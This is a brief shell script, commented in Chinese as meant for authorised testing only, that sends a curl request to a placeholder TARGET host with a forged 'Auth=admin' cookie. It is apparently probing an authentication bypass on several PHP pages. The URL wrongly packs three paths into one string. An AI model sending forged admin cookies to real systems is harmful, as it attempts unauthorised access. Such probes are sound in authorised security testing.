#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X GET 'http://TARGET:8080/058_01.php, /058_04.php, /058_08.php' \
  -H 'Cookie: Auth=admin'
